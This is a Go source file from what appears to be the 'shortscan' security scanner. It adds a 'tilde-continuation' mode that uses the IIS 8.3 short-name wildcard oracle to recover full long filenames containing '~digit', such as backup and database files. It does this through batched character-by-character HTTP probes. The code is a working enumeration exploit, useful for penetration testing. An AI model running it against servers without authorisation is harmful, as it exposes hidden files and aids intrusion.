package shortscan

import (
	"fmt"
	"net/http"
	"strings"
	"sync"

	"github.com/fatih/color"
)

// Tilde-continuation: recover the FULL long name of any file whose name contains a
// literal `~<digit>` (e.g. Backup~2024.zip, db~1.bak, Report~2final.docx).
//
// The 8.3 tilde oracle is normally bounded to 6 prefix + 3 extension characters: the
// query `PREFIX*~1*` matches only the generated SHORT name, whose 7th character is the
// tilde. But MS-FSA matches the wildcard expression against the entry's Name OR its
// ShortName. A `~<digit>` sequence is exactly what makes IIS engage the wildcard
// directory lookup, so when the target's LONG name itself contains that `~<digit>`, the
// expression matches the Name branch and every character before AND after the tilde can
// be pinned with wildcards. That blows past the 6-character wall and even surfaces
// 8.3-legal files (`Ab~7xyz.txt`) that have no generated short name and are otherwise
// invisible. Live-confirmed on Win11/IIS10 (2026-08).
//
// This is the known "special long filename" technique (`???????*~<0-9>`); shortscan's
// core loop only probed `~1..~4` and never continued past 6, so this fills that gap.

// tildeContChars is the alphabet used to pin each character of a literal-tilde long name.
// The oracle is case-insensitive (matches the upper-cased name), so upper-case letters,
// digits and the two filename symbols that appear most often are enough for a first pass.
const tildeContChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"

const (
	tildeContMaxPrefix = 40 // safety caps so a pathological directory can't loop forever
	tildeContMaxSuffix = 40
	tildeContMaxExt    = 12
)

// runTildeContinuation probes each `~<digit>` anchor in a scanned directory and, where a
// literal-tilde long name exists, enumerates it in full. It is a per-directory post-step
// (like the WebDAV lift), gated by --tilde-continuation / --auto / --full.
func runTildeContinuation(hc *http.Client, st *httpStats, ac *attackConfig, mk markers, baseURL string) {
	if !(args.TildeContinuation || args.Auto || args.Full) {
		return
	}
	if !markerUsable(mk) {
		return // no usable oracle for this directory
	}
	dir := baseURL
	if !strings.HasSuffix(dir, "/") {
		dir += "/"
	}

	hit := func(pattern string) bool {
		res, err := fetch(hc, st, ac.method, dir+pattern+ac.suffix)
		return err == nil && responseMatchesPositive(res, mk)
	}
	// firstChar returns the first alphabet character (in tildeContChars order) for
	// which probe(char) hits, or "". The char-by-char walk below calls this once
	// per position, and a sequential per-char probe used to be the dominant cost
	// of this feature (up to 39 blocking requests per position). Probe a small
	// batch of the alphabet concurrently instead — same shape as the main matrix's
	// combo batching: bounded (<=8) so a real early-alphabet hit still wastes only
	// a handful of requests, deterministic (a batch's winner is always its
	// earliest-order hit, never whichever request happened to land first).
	firstChar := func(probe func(string) bool) string {
		batchSize := args.Concurrency
		if batchSize < 1 {
			batchSize = 1
		}
		if batchSize > 8 {
			batchSize = 8
		}
		chars := []rune(tildeContChars)
		for start := 0; start < len(chars); start += batchSize {
			end := start + batchSize
			if end > len(chars) {
				end = len(chars)
			}
			batch := chars[start:end]
			hits := make([]bool, len(batch))
			var wg sync.WaitGroup
			for i, c := range batch {
				wg.Add(1)
				go func(i int, c rune) {
					defer wg.Done()
					hits[i] = probe(string(c))
				}(i, c)
			}
			wg.Wait()
			for i, h := range hits {
				if h {
					return string(batch[i])
				}
			}
		}
		return ""
	}

	seen := make(map[string]struct{})
	// 8.3 aliases the classic enumeration already reported for this host. A recovered
	// name that equals one of them is that same alias (e.g. WEB~1.CON), not a genuine
	// long name past the 6+3 barrier — drop it so the [TILDE-CONT] section never echoes
	// a line the [SHORTNAMES] block already printed.
	knownAliases := bufferedShortNameSet(ac)
	var recoveredNames []string
	for d := 0; d <= 9; d++ {
		anchor := tildify("~") + fmt.Sprintf("%d", d)
		if !hit("*" + anchor + "*") {
			continue
		}
		// Catch-all / soft-response guard: a real literal-tilde name does not let an
		// IMPOSSIBLE random continuation match. If ~d preceded OR followed by 8 random
		// chars still hits, the server answers positively for anything at this anchor
		// and the char-by-char walk below would run to the cap and emit a garbage
		// max-length name (e.g. ~2DAABABAB…BAEAAABABABA). Skip the digit instead.
		if hit(pathEscape(randAlnum(8))+"*"+anchor+"*") || hit(anchor+pathEscape(randAlnum(8))+"*") {
			continue
		}
		// Prefix before the ~<digit>: <prefix><c>*~d*  (extends with NO 6-char cap).
		prefix := ""
		for len(prefix) < tildeContMaxPrefix {
			c := firstChar(func(ch string) bool { return hit(pathEscape(prefix+ch) + "*" + anchor + "*") })
			if c == "" {
				break
			}
			prefix += c
		}
		// Suffix after the ~<digit>: <prefix>~d<suffix><c>*
		suffix := ""
		for len(suffix) < tildeContMaxSuffix {
			c := firstChar(func(ch string) bool { return hit(pathEscape(prefix) + anchor + pathEscape(suffix+ch) + "*") })
			if c == "" {
				break
			}
			suffix += c
		}
		// Extension: <prefix>~d<suffix>.<ext><c>*
		ext := ""
		for len(ext) < tildeContMaxExt {
			c := firstChar(func(ch string) bool {
				return hit(pathEscape(prefix) + anchor + pathEscape(suffix) + "." + pathEscape(ext+ch) + "*")
			})
			if c == "" {
				break
			}
			ext += c
		}

		// Runaway guard: a legitimate literal-tilde name does not extend to the safety
		// cap in any dimension. Hitting the cap means the negative control above missed
		// a partial catch-all, so discard rather than emit a capped garbage name.
		if len(prefix) >= tildeContMaxPrefix || len(suffix) >= tildeContMaxSuffix || len(ext) >= tildeContMaxExt {
			continue
		}
		name := prefix + "~" + fmt.Sprintf("%d", d) + suffix
		if ext != "" {
			name += "." + ext
		}
		// Skip degenerate results: a real `PREFIX~d` collision (EXACTLY the classic
		// 6-char truncated prefix, empty suffix) is just the short name the core scan
		// already reported — not a literal-tilde long name. This must be == 6, not
		// <= 6: a genuinely short literal-tilde file (e.g. a real "AB~1.txt", prefix
		// "AB", never truncated because it was already short) is exactly the
		// invisible-to-the-classic-oracle class this feature exists to surface, and a
		// <= 6 skip silently dropped it as if it were the ordinary classic alias.
		// Also require ext <= 3: a classic 8.3 short extension can never exceed 3
		// characters, so a recovered extension longer than that (e.g. "ABCDEF~1.HTML")
		// cannot possibly be the classic alias no matter how the prefix/suffix land —
		// it is a genuine long-name recovery and must not be discarded here.
		if suffix == "" && len(prefix) == 6 && len(ext) <= 3 {
			continue
		}
		// Same alias the classic scan already surfaced (any base length): not a
		// long-name recovery, just the 8.3 short echoed back. Drop it.
		if _, isAlias := knownAliases[strings.ToLower(name)]; isAlias {
			continue
		}
		if _, dup := seen[name]; dup {
			continue
		}
		seen[name] = struct{}{}
		if args.Output != "human" {
			printJSON(map[string]any{"type": "tilde-continuation", "dir": dir, "name": name})
		} else {
			recoveredNames = append(recoveredNames, name)
		}
		recordTildeContinuationFinding(hc, st, ac, dir, name, ext == "")
	}
	reportTildeContinuation(ac, recoveredNames)
}

// recordTildeContinuationFinding feeds a recovered literal-tilde long name back
// into the pipeline the same way markResolvedFile does for every other recovery
// path. Without this, a directory recovered here is never queued for --recurse
// and a crawlable file recovered here never seeds the reference crawler — the
// exact gap --webdav's PROPFIND lift had before it was fixed to do the same.
func recordTildeContinuationFinding(hc *http.Client, st *httpStats, ac *attackConfig, dir, name string, extensionless bool) {
	if ac == nil {
		return
	}
	candidatePath := pathEscape(name)
	ac.foundFiles[foundFileKey(candidatePath)] = struct{}{}
	rememberReferenceSeed(ac, dir, candidatePath)
	if !args.Recurse {
		return
	}
	// An extensionless recovered name doesn't tell us file vs directory on its
	// own (recovery.go's markResolvedFile makes the same call for the same
	// reason) — queue it for Scan's normal pre-flight to confirm either way.
	if extensionless {
		ac.foundDirectories[candidatePath] = struct{}{}
		return
	}
	res, err := fetch(hc, st, "HEAD", dir+candidatePath)
	if err != nil {
		return
	}
	if redirectsToDirectory(res, dir+candidatePath) {
		ac.foundDirectories[candidatePath] = struct{}{}
	}
}

// reportTildeContinuation prints every literal-~digit long name recovered in
// this directory as one section (header + indented list), matching
// [WEBDAV-LIFT]'s shape instead of one full bracketed line per name.
func reportTildeContinuation(ac *attackConfig, names []string) {
	if len(names) == 0 || args.Output != "human" {
		return
	}
	beginSection(ac)
	printHuman(color.HiCyanString("[TILDE-CONT] %s past 6+3", pluralCount(len(names), "name", "names")))
	for _, name := range names {
		printHuman("  " + color.HiGreenString(name))
	}
}
